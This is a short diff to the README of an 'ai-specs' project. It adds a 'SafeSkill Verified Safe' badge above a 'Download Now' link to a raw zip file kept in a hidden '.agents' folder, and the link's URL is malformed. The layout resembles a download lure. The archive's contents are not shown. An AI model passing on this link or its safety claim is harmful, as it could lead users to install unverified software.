@@ -1,5 +1,7 @@
 # 🎉 ai-specs - Easy Setup for AI Development 
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/sanjusathian-ai-specs)
+
 ## 📥 Download Now
 [![Download ai-specs](https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip%https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip)](https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip)
 
